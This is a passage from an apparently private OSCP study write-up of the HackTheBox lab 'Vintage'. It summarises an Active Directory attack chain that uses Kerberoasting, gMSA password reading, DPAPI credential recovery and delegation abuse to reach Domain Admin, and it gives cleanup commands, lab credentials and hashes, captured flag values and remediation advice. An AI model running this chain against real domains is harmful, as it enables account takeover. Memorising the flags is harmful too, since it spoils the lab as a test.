| Administrator impersonation returned `STATUS_LOGON_TYPE_NOT_GRANTED` | Impersonate the confirmed Domain Admin `L.Bianchi_adm` instead |
| WMI worked with the delegated cache | Use a one-shot SYSTEM task only for final proof and remove it immediately |

## Collect the flags

Once the `C.Neri` foothold and SYSTEM proof were complete, the source workflow recorded both flags in `loot/flags.txt`. The values are intentionally kept inside this private vault note and are not repeated in chat.

```powershell
type C:\Users\C.Neri\Desktop\user.txt
```

```text
The SYSTEM proof read C:\Users\Administrator\Desktop\root.txt into the temporary evidence file before cleanup.
```

### Captured flag values from source loot

#### `loot/flags.txt`

```text
user: 92671f7ef03aab85928d8560c667259c
root: 112b49ec1727665fd1a2a144cae85828
```

## Clean down

The source transcript records `boxdone` after the temporary directory objects, SPN, account state, group additions, scheduled task, temporary file, and local host entry were restored. The important cleanup actions were:

On the domain through the retained Kerberos admin cache:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  remove groupMember DelegatedAdmins 'FS01$'

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  remove groupMember ServiceManagers 'gMSA01$'

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  set object svc_sql servicePrincipalName -v ''

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  set object svc_sql userAccountControl -v 66050
```

Verify the restored state:

```bash
KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  get object ServiceManagers --attr member

KRB5_CONFIG="$BoxDir/notes/krb5.conf" \
KRB5CCNAME="$BoxDir/loot/c.neri_adm.ccache" \
  bloodyAD -d vintage.htb -u c.neri_adm \
  -k ccache="$BoxDir/loot/c.neri_adm.ccache" kdc="$BoxIP" \
  -H dc01.vintage.htb -i "$BoxIP" \
  get object svc_sql --attr userAccountControl servicePrincipalName
```

On the target, confirm the one-shot task and temporary file are gone:

```cmd
schtasks /query /tn RootFlag
del C:\Windows\Temp\rf.txt
```

On Kali, restore `/etc/hosts` and close listeners:

```bash
sudo cp -a "$BoxDir/notes/hosts.before" /etc/hosts
ss -ltnup | grep -E ':4444|:4445|:8000' || true
boxdone
```

> [!warning] 💡 Cleanup boundary
> Directory group membership, SPNs, UAC state, scheduled tasks, and `/etc/hosts` are separate artifacts. Verify each one independently; removing the RBCD group member does not restore the service-account SPN or disabled state.

## Attack narrative in one page

1. Nmap identified DC01's DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM, and ADWS services.
2. The supplied `P.Rosa` credential authenticated through Kerberos; NTLM returned `STATUS_NOT_SUPPORTED`.
3. LDAP and BloodHound exposed the pre-created `FS01$` computer account, `gMSA01$`, `ServiceManagers`, `svc_sql`, `DelegatedAdmins`, and the DC01 `AllowedToAct` relationship.
4. The pre-created machine account accepted `fs01` as its password and read the gMSA managed password.
5. `gMSA01$` was added to `ServiceManagers`; after renewing its TGT, it enabled `svc_sql` and set an HTTP SPN.
6. A targeted Kerberoast ticket for `svc_sql` was cracked offline, and the password was reused by `C.Neri`.
7. `C.Neri`'s Credential Manager blob was decrypted with the correct DPAPI masterkey, recovering `C.Neri_adm`.
8. `C.Neri_adm` added `FS01$` to `DelegatedAdmins`; token-group verification and a renewed machine TGT made the relationship usable.
9. RBCD S4U2Proxy impersonated `L.Bianchi_adm`, a Domain Admin, to DC01.
10. Kerberos WMI created a one-shot SYSTEM scheduled task, the private flags were collected, and all temporary changes were restored.

## Tools used

| Tool | Purpose |
|---|---|
| `nmap` | Full TCP and AD service enumeration |
| `getTGT.py` | Obtain Kerberos TGTs for users, gMSA, and computer accounts |
| `nxc` | Kerberos cache validation over SMB |
| `ldapsearch` | RootDSE, users, group membership, and token-group validation |
| `bloodhound-python` | Collect AD relationships and ACL edges |
| `bloodyAD` | Read gMSA data, modify group membership, set SPNs/UAC, and verify cleanup |
| `GetUserSPNs.py` | Request the targeted service ticket |
| `john` | Crack the Kerberoast ticket offline |
| `evil-winrm` | Open the `C.Neri` Windows foothold; local compatibility patch required |
| `dpapi.py` | Decrypt Windows DPAPI masterkeys and Credential Manager data |
| `getST.py` | Request the S4U2Self/S4U2Proxy delegated service ticket |
| `wmiexec.py` | Use the delegated Kerberos cache for DC01 command execution |

## Credentials and secrets

| Account | Credential | Service or use | Source/notes |
|---|---|---|---|
| `P.Rosa` | `Rosaisbest123` | Initial Kerberos assumed breach | User-supplied starting credential |
| `FS01$` | `fs01` | Pre-created computer-account TGT | Machine name used as password |
| `gMSA01$` | NT hash retained privately below | Managed-password Kerberos TGT | Read through `FS01$` |
| `svc_sql` | Recovered password retained privately below | Kerberoast and password reuse | TGS crack; reused by `C.Neri` |
| `C.Neri` | Reused `svc_sql` password | Kerberos/WinRM foothold | Credential Manager profile owner |
| `C.Neri_adm` | DPAPI-recovered password retained privately below | Delegated group modification | Credential Manager target |
| `L.Bianchi_adm` | Delegated ticket only | Domain Admin impersonation | S4U2Proxy target |

### Captured private values from source loot

These values are retained because this is a private vault. Do not copy them into a public report or chat transcript.

#### `.env`

```text
export BoxName="Vintage"
export BoxIP="10.129.231.205"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Vintage"
export Domain=vintage.htb
export DCip=10.129.231.205
export Username=c.neri_adm
export Password=Uncr4ck4bl3P4ssW0rd0312
export GMSAhash=c50f79ceb0abdedcd63683cbfb6992bb
export MasterKey=0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

#### Recovered credentials

```text
P.Rosa       : Rosaisbest123
svc_sql      : Zer0the0ne
C.Neri       : Zer0the0ne (password reuse)
C.Neri_adm   : Uncr4ck4bl3P4ssW0rd0312
gMSA01$ NTLM : c50f79ceb0abdedcd63683cbfb6992bb
```

#### `loot/flags.txt`

```text
user: 92671f7ef03aab85928d8560c667259c
root: 112b49ec1727665fd1a2a144cae85828
```

### Sensitive transcript evidence

```text
NTLM authentication: STATUS_NOT_SUPPORTED
[*] Saving ticket in P.Rosa.ccache
[*] Saving ticket in FS01$.ccache
[+] gMSA01$ added to ServiceManagers
[+] svc_sql's userAccountControl has been updated
[+] svc_sql's servicePrincipalName has been updated
[*] Impersonating L.Bianchi_adm
[*] Saving ticket in L.Bianchi_adm.ccache
SUCCESS: Attempted to run the scheduled task "RootFlag".
```

### Additional captured source values

| Value | Source |
|---|---|
| `dc01.vintage.htb` | `loot/ldap-rootdse.txt` |
| `DC=vintage,DC=htb` | `loot/ldap-rootdse.txt` |
| `svc_sql` SPN `http/svc_sql.vintage.htb` | `loot/kerberoast.hashes`, transcript |
| C.Neri SID `S-1-5-21-4024337825-2033394866-2055507597-1115` | Transcript and DPAPI commands |
| `DelegatedAdmins` SID ending `1131` | BloodHound JSON and tokenGroups validation |
| `FS01$` SPNs | BloodHound computer data |

## Remediation recommendations

1. Replace pre-created computer-account passwords with long random secrets and rotate them before the account is delegated for use.
2. Restrict `msDS-GroupMSAMembership` so only the intended hosts and service principals can read the gMSA managed password.
3. Remove `GenericWrite` and `AddSelf` from service-management groups unless the business need is explicit and reviewed.
4. Keep disabled service accounts disabled and prevent delegated groups from enabling or changing their SPNs.
5. Do not reuse service-account passwords for human accounts.
6. Treat Credential Manager and DPAPI material as sensitive; use managed secrets and remove unnecessary saved credentials.
7. Review `msDS-AllowedToActOnBehalfOfOtherIdentity` on DC01 and avoid granting a writable group control over that descriptor.
8. Monitor changes to group membership, SPNs, userAccountControl, gMSA readers, and RBCD descriptors.
9. Keep NTLM disabled, but also enforce Kerberos name resolution and monitor unusual machine-account S4U activity; NTLM disablement alone does not prevent Kerberos abuse.

## Lessons learned and vault links

- Kerberos failures and NTLM failures are different signals. A valid password can still be unusable through an NTLM-only client.
- A group edge is actionable only after its write right, current member list, and downstream target relationship are verified.
- Renew tickets after directory authorization changes; stale TGTs were responsible for the misleading first failures.
- `C.Neri_adm` was not the S4U source. The SPN-bearing computer account was the correct source, while the recovered admin account supplied the group modification.
- DPAPI analysis is a mapping problem: exact SID, correct masterkey, correct credential blob, and preserved key formatting all matter.
- RBCD proof and final SYSTEM proof are separate evidence points; the report must show both.

Related pages:

- [[OSCP/RUNBOOK V2/AD - Service Scan]]
- [[OSCP/RUNBOOK V2/AD - Credential Validation]]
- [[OSCP/RUNBOOK V2/AD - BloodHound]]
- [[OSCP/RUNBOOK V2/AD - Group Triage]]
- [[OSCP/RUNBOOK V2/AD - Kerberoasting]]
- [[OSCP/RUNBOOK V2/AD - WinRM Foothold]]
- [[OSCP/RUNBOOK V2/AD - Local Credential Search]]
- [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation]]
- [[OSCP/RUNBOOK V2/AD - Clean Down]]
- [[OSCP/MODERN TOOLING/BloodyAD]]
- [[OSCP/MODERN TOOLING/BloodHound-Python]]
- [[OSCP/MODERN TOOLING/NetExec]]
- [[OSCP/MODERN TOOLING/Evil-WinRM]]
- [[OSCP/MODULES/22. Active Directory Introduction and Enumeration]]
- [[OSCP/MODULES/23. Attacking Active Directory Authentication]]
- [[OSCP/MODULES/24. Lateral Movement in Active Directory]]

## External resources

- [Microsoft: Group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [Microsoft: msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- [BloodHound documentation](https://bloodhound.specterops.io/)
- [Impacket](https://github.com/fortra/impacket)
- [iRed.Team: Resource-Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [DPAPI credential recovery reference](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi.html)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/AD - Service Scan|AD service scan]] -- identify the domain, DC, clock, and Kerberos/LDAP/SMB surface
- [[OSCP/RUNBOOK V2/AD - Credential Validation|Credential validation]] -- choose Kerberos when NTLM is disabled
- [[OSCP/RUNBOOK V2/AD - BloodHound|BloodHound]] -- map gMSA, ACL, group, and RBCD relationships
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|Kerberoasting]] -- target the exact SPN and crack offline
- [[OSCP/RUNBOOK V2/AD - Local Credential Search|Local credential search]] -- collect Credential Manager and DPAPI artifacts
- [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation|RBCD]] -- refresh group membership, request S4U tickets, and validate service access
- [[OSCP/RUNBOOK V2/AD - Clean Down|AD clean down]] -- restore group membership, SPN/UAC state, local hosts, and task artifacts

## Why this matters for OSCP

Vintage is a complete example of an assumed-breach AD chain where no single command is the exploit. The exam-relevant skill is keeping the evidence transitions separate: identify the authentication protocol, validate the machine account, read and use the gMSA secret, follow object permissions into groups, renew tickets after changes, recover a stored credential, verify group-based RBCD with `tokenGroups`, request the correct service ticket, and clean every directory and host-side artifact.
